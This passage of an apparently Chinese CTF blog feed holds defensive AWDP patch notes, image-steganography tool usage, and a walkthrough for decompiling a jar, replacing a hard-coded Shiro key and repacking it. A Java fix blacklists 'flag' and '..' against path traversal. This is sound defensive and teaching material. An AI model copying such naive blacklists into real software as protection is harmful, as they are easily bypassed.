punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fix：直接对File类下手</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">readFile</span><span class="token punctuation">(</span><span class="token class-name">String</span> filePath<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> blackList <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">".."</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> blackList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>filePath<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token class-name">String</span> file_content <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">int</span> readCount <span class="token operator">=</span> fileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>readCount <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>           file_content <span class="token operator">=</span> file_content <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> readCount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span> file_content<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> th<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">throw</span> th<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"strings"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>filterList <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">&#125;</span>str <span class="token operator">:=</span> <span class="token string">"ana"</span> <span class="token comment">// 匹配包含"ana"的字符串</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> s <span class="token operator">:=</span> <span class="token keyword">range</span> filterList <span class="token punctuation">&#123;</span><span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h1><p>update.sh</p><p>常规php文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> 要替换的文件 /var/www/html/待替换的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>python：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">cp</span> /app.py /app/app.py<span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> python <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token function">grep</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token builtin class-name">cd</span> /app <span class="token operator">&amp;&amp;</span> <span class="token function">nohup</span> python app.py  <span class="token operator">>></span> /opt/app.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nodejs：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">cp</span> server.js /app/server.js<span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">node</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token function">grep</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token builtin class-name">cd</span> /app <span class="token operator">&amp;&amp;</span> <span class="token function">nohup</span> <span class="token function">node</span> server.js  <span class="token operator">>></span> /opt/aa.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>golang：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> ./修改后编译好的文件 /编译文件的目录<span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span><span class="token function">grep</span> go编译的名字<span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> <span class="token parameter variable">-9</span><span class="token builtin class-name">cd</span> /编译文件目录 <span class="token operator">&amp;&amp;</span>./执行编译文件 <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>java：</p><p>直接覆盖jar包重启环境</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/06/01/awd/&quot;&gt;https://fushuling.com/index.php/2023/06/01/awd/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://5ime.cn/awdp.html#nexmoe-content&quot;&gt;https://5ime.cn/awdp.html#nexmoe-content&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackerpoet.com/index.php/archives/988/&quot;&gt;https://hackerpoet.com/index.php/archives/988/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="AWDP" scheme="http://c1oudfl0w0.github.io/blog/categories/AWDP/"/>
    
    
  </entry>
  
  <entry>
    <title>图片隐写</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</id>
    <published>2024-06-18T07:31:46.000Z</published>
    <updated>2024-06-18T08:04:57.903Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本着有接触过就稍微记录一下的原则，于是就有了这个</p><span id="more"></span><hr><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><h3 id="png"><a href="#png" class="headerlink" title="png"></a>png</h3><p>参考：<a href="https://www.freebuf.com/articles/others-articles/265879.html">https://www.freebuf.com/articles/others-articles/265879.html</a></p><p>文件头：<code>89 50 4E 47 0D 0A 1A 0A</code></p><h4 id="IHDR"><a href="#IHDR" class="headerlink" title="IHDR"></a>IHDR</h4><blockquote><p>文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p></blockquote><p>文件头数据块由13字节组成，它的格式如下表所示：</p><table><thead><tr><th><strong>域的名称</strong></th><th><strong>字节数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Width</td><td>4 bytes</td><td>图像宽度，以像素为单位</td></tr><tr><td>Height</td><td>4 bytes</td><td>图像高度，以像素为单位</td></tr><tr><td>Bit depth</td><td>1 byte</td><td>图像深度： 索引彩色图像：1，2，4或8 灰度图像：1，2，4，8或16 真彩色图像：8或16</td></tr><tr><td>ColorType</td><td>1 byte</td><td>颜色类型： 0：灰度图像, 1，2，4，8或16 2：真彩色图像，8或16 3：索引彩色图像，1，2，4或8 4：带α通道数据的灰度图像，8或16 6：带α通道数据的真彩色图像，8或16</td></tr><tr><td>Compression method</td><td>1 byte</td><td>压缩方法(LZ77派生算法)</td></tr><tr><td>Filter method</td><td>1 byte</td><td>滤波器方法</td></tr><tr><td>Interlace method</td><td>1 byte</td><td>隔行扫描方法： 0：非隔行扫描 1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td></tr></tbody></table><p>IHDR（49 48 44 52）数据块关键字之后紧接的就是定义宽与高的字节块，具体可以先看图片属性中的宽高然后转为16进制后再搜索发现对应的字节块（同样也适用于jpg）</p><hr><h3 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h3><hr><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>参考：<a href="https://goodapple.top/archives/700">https://goodapple.top/archives/700</a></p><p>实体文件头：包含着文件的各种信息，包括文件名称、解压缩版本、压缩方式、CRC等等，固定值<code>50 4B 03 04</code></p><hr><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><blockquote><p>LSB替换写基本思路是用嵌入的秘密信息取代载体图像的最低比特位，原来的7个高位平面与替代秘密信息的最低为平面组合成含隐藏信息的新图形。</p></blockquote><ol><li>像素三原色（RGB）</li><li>通过修改像素中最低位的1bit来达到隐藏的效果。</li><li>工具：stegsolve、zsteg、python脚本</li></ol><hr><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h2><p>参考：<a href="https://blog.csdn.net/Amherstieae/article/details/107512398">https://blog.csdn.net/Amherstieae/article/details/107512398</a></p><blockquote><p>可以检测并提取出PNG和BMP图片里的隐写数据</p></blockquote><p>github：<a href="https://github.com/zed-0xff/zsteg">https://github.com/zed-0xff/zsteg</a></p><p>安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> zsteg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看lsb数据：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsteg xxx.bmpzsteg xxx.pngzsteg <span class="token parameter variable">-a</span> <span class="token punctuation">(</span>文件名<span class="token punctuation">)</span>    <span class="token comment">#查看各个通道的lsb</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/image-20240618153734927.png" alt="image-20240618153734927"></p><p>检测zlib：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#-b的位数是从1开始的</span>zsteg zlib.bmp <span class="token parameter variable">-b</span> <span class="token number">1</span> <span class="token parameter variable">-o</span> xy <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>提取图片对应通道的内容，根据对应通道的文件类型确定后缀名：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsteg <span class="token parameter variable">-E</span> b1,rgb,lsb,xy <span class="token number">1</span>.png <span class="token operator">></span> out.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2><p>参考：<a href="https://www.freebuf.com/sectool/359063.html">https://www.freebuf.com/sectool/359063.html</a></p><blockquote><p>将图片中的隐藏文件拆分出来</p></blockquote><p>安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> foremost<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分析文件，然后输出到output文件夹：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">foremost <span class="token parameter variable">-I</span> <span class="token function">file</span> <span class="token parameter variable">-o</span> output<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>audit.txt分析报告也会一并输出到文件夹中</p><hr><h2 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h2><p>参考：<a href="https://blog.csdn.net/dyw_666666/article/details/88650738">https://blog.csdn.net/dyw_666666/article/details/88650738</a></p><p>下载地址：<a href="http://www.caesum.com/handbook/Stegsolve.jar">http://www.caesum.com/handbook/Stegsolve.jar</a></p><p>Analyse下的功能：</p><ul><li><p>File Format：文件格式，这个主要是查看图片的具体信息</p></li><li><p>Data Extract：数据抽取，图片中隐藏数据的抽取</p></li><li><p>Frame Browser：帧浏览器，主要是对GIF之类的动图进行分解，动图变成一张张图片，便于查看</p></li><li><p>Image Combiner：拼图，图片拼接</p></li></ul><h3 id="Data-Extract——检测LSB（最低有效位）隐写"><a href="#Data-Extract——检测LSB（最低有效位）隐写" class="headerlink" title="Data Extract——检测LSB（最低有效位）隐写"></a>Data Extract——检测LSB（最低有效位）隐写</h3><p>参考：<a href="https://developer.aliyun.com/article/1090023">https://developer.aliyun.com/article/1090023</a></p><p>Data Extract下调整Bit Planes、Bit Order、Bit Plane Order</p><p>一般Bit Planes都是把rgb通道设置为0，然后调整剩下的几个选项</p><h3 id="Image-Combiner——双图操作"><a href="#Image-Combiner——双图操作" class="headerlink" title="Image Combiner——双图操作"></a>Image Combiner——双图操作</h3><p>参考：<a href="https://developer.aliyun.com/article/1090023">https://developer.aliyun.com/article/1090023</a></p><p>当两张 jpg 图片外观、大小、像素都基本相同时，可以考虑进行综合分析，即将两个文件的像素RGB值进行XOR、ADD、SUB等操作，看能否得到有用的信息</p><p>这里使用Image Combiner</p><p>只需要在弹出的窗口中点击左右按钮选择处理方式，有两张图片的RGB值进行XOR、ADD、SUB等操作</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本着有接触过就稍微记录一下的原则，于是就有了这个&lt;/p&gt;</summary>
    
    
    
    <category term="MISC" scheme="http://c1oudfl0w0.github.io/blog/categories/MISC/"/>
    
    
  </entry>
  
  <entry>
    <title>Java修改jar包&amp;DocToolkit fix复现</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/</id>
    <published>2024-06-17T17:03:14.000Z</published>
    <updated>2024-06-22T17:28:56.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>给长城杯半决赛线下的jar包创碎很久之后想起来要学这个了，这篇文章基本上可以算是全抄参考文章的了</p><p>参考：</p><p><a href="https://natro92.fun/posts/82174079/">https://natro92.fun/posts/82174079/</a></p><span id="more"></span><hr><h1 id="冷补丁修改-jar-包（一）"><a href="#冷补丁修改-jar-包（一）" class="headerlink" title="冷补丁修改 jar 包（一）"></a>冷补丁修改 jar 包（一）</h1><p>准备反编译jar包需要的工具：</p><p>cfr：这里选择0.152版本（注意这个好像不能挂代理访问）<a href="http://www.benf.org/other/cfr/">http://www.benf.org/other/cfr/</a></p><p>附件选择长城杯半决赛的DocToolkit</p><p>批量转换class文件：（by Natro92）</p><p>decompile.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># WSL运行</span><span class="token comment"># 设置CFR JAR文件的路径</span><span class="token assign-left variable">CFR_JAR</span><span class="token operator">=</span><span class="token string">"cfr-0.152.jar"</span><span class="token comment"># 设置class文件的根目录</span><span class="token assign-left variable">CLASS_ROOT</span><span class="token operator">=</span><span class="token string">"src/main/java"</span><span class="token comment"># 查找所有的class文件并反编译为java文件</span><span class="token function">find</span> <span class="token variable">$CLASS_ROOT</span> <span class="token parameter variable">-name</span> <span class="token string">"*.class"</span> <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token builtin class-name">read</span> class_file<span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token comment"># 获取class文件的目录和文件名</span>    <span class="token assign-left variable">class_dir</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">dirname</span> <span class="token string">"<span class="token variable">$class_file</span>"</span><span class="token variable">)</span></span>    <span class="token assign-left variable">class_name</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">basename</span> <span class="token string">"<span class="token variable">$class_file</span>"</span> .class<span class="token variable">)</span></span>    <span class="token builtin class-name">echo</span> <span class="token variable">$class_name</span>    <span class="token comment"># 反编译class文件并将输出重定向到.java文件</span>    <span class="token function">java</span> <span class="token parameter variable">-jar</span> <span class="token variable">$CFR_JAR</span> <span class="token string">"<span class="token variable">$class_file</span>"</span> <span class="token operator">></span> <span class="token string">"<span class="token variable">$class_dir</span>/<span class="token variable">$class_name</span>.java"</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先把 jar 文件解压到 example 目录（因为是<code>com.example</code>）中（PS：今天才知道 wsl 的<code>/mnt/</code>目录下是我们Windows主机对应的文件，而且可以用任何linux命令，这谁还用传统windows终端啊，以后直接打开文件夹执行wsl就行了）</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240618012204750.png" alt="image-20240618012204750"></p><p>解压 jar 包到 example 文件夹中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> DocToolkit-0.0.1-SNAPSHOT.jar <span class="token parameter variable">-d</span> example<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再将 class 文件放入相关目录中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token parameter variable">-p</span> src/main/java<span class="token function">cp</span> <span class="token parameter variable">-r</span> example/BOOT-INF/classes/* src/main/java/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后进行反编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sh</span> decompile.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619003010977.png" alt="image-20240619003010977"></p><p>后面我们需要对 src 中的 class 文件修改，再移回 example 中</p><p>先本地起一下java环境</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> DocToolkit-0.0.1-SNAPSHOT.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问localhost:8080，注意这里的localhost实际的ip地址取决于起环境的终端是哪个（wsl的话需要自己看一下<code>ip addr</code>）</p><p>然后取出我们jar包的shirokey</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619002249974.png" alt="image-20240619002249974"></p><p>测试一下</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619002315399.png" alt="image-20240619002315399"></p><h2 id="修改默认key"><a href="#修改默认key" class="headerlink" title="修改默认key"></a>修改默认key</h2><p>先利用这个工具随机生成一个key：<code>Iyxx0SgsspVZvsJ2E5ke3g==</code></p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619002550752.png" alt="image-20240619002550752"></p><p>然后修改源码中的硬编码 key 值（别忘了前面要用cfr反编译）：</p><p>src\main\java\com\example\doctoolkit\shiro\ShiroConfig.java</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619003157137.png" alt="image-20240619003157137"></p><p>接下来生成新的class文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CLASS_LIB</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">find</span> example/BOOT-INF/lib/ <span class="token parameter variable">-name</span> <span class="token string">"*.jar"</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'\n'</span> <span class="token string">':'</span><span class="token variable">)</span></span><span class="token punctuation">;</span>javac <span class="token parameter variable">-cp</span> <span class="token string">".:<span class="token variable">$&#123;CLASS_LIB<span class="token operator">%</span><span class="token operator">:</span>&#125;</span>"</span> src/main/java/com/example/doctoolkit/shiro/ShiroConfig.java src/main/java/com/example/doctoolkit/shiro/UserRealm.java src/main/java/com/example/doctoolkit/controller/admin/AdminController.java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619003524692.png" alt="image-20240619003524692"></p><p>此时就修改成功了</p><h2 id="重新打包"><a href="#重新打包" class="headerlink" title="重新打包"></a>重新打包</h2><p>先替换原有的 class 文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> src/main/java/com/example/doctoolkit/shiro/ShiroConfig.class example/BOOT-INF/classes/com/example/doctoolkit/shiro/ShiroConfig.class<span class="token function">cp</span> src/main/java/com/example/doctoolkit/shiro/UserRealm.class example/BOOT-INF/classes/com/example/doctoolkit/shiro/UserRealm.class<span class="token function">cp</span> src/main/java/com/example/doctoolkit/controller/admin/AdminController.class example/BOOT-INF/classes/com/example/doctoolkit/controller/admin/AdminController.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后打包，把 lib 中的每一个 jar 文件都解压到目录中</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> example/BOOT-INF/lib<span class="token keyword">for</span> <span class="token for-or-select variable">jar</span> <span class="token keyword">in</span> *.jar<span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> <span class="token string">"../lib_unpacked/<span class="token variable">$jar</span>"</span>    <span class="token builtin class-name">cd</span> <span class="token string">"../lib_unpacked/<span class="token variable">$jar</span>"</span>    jar <span class="token parameter variable">-xvf</span> <span class="token string">"../../lib/<span class="token variable">$jar</span>"</span>    <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/lib<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619004100091.png" alt="image-20240619004100091"></p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619004144902.png" alt="image-20240619004144902"></p><p>过程有点小久</p><p>然后再重新打包 lib 中 jar 文件，依旧需要花上一点时间</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/lib_unpacked<span class="token keyword">for</span> <span class="token for-or-select variable">dir</span> <span class="token keyword">in</span> *<span class="token punctuation">;</span> <span class="token keyword">do</span>     jar <span class="token parameter variable">-cvfM0</span> <span class="token string">"../lib/<span class="token variable">$dir</span>.jar"</span> <span class="token parameter variable">-C</span> <span class="token string">"<span class="token variable">$dir</span>"</span> <span class="token builtin class-name">.</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再打包主 jar 文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>jar <span class="token parameter variable">-cvfM0</span> <span class="token punctuation">..</span>/example_repacked.jar <span class="token parameter variable">-C</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>打包完成后我们运行新的jar包</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619005712018.png" alt="image-20240619005712018"></p><p>重新测试密钥：<code>Iyxx0SgsspVZvsJ2E5ke3g==</code></p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619005950967.png" alt="image-20240619005950967"></p><p>新的key检测了出来，说明修改成功</p><hr><h1 id="冷补丁修改-jar-包（二）"><a href="#冷补丁修改-jar-包（二）" class="headerlink" title="冷补丁修改 jar 包（二）"></a>冷补丁修改 jar 包（二）</h1><hr><h1 id="war包"><a href="#war包" class="headerlink" title="war包"></a>war包</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cvf</span> xxx.war ./*<span aria-hidden="true" 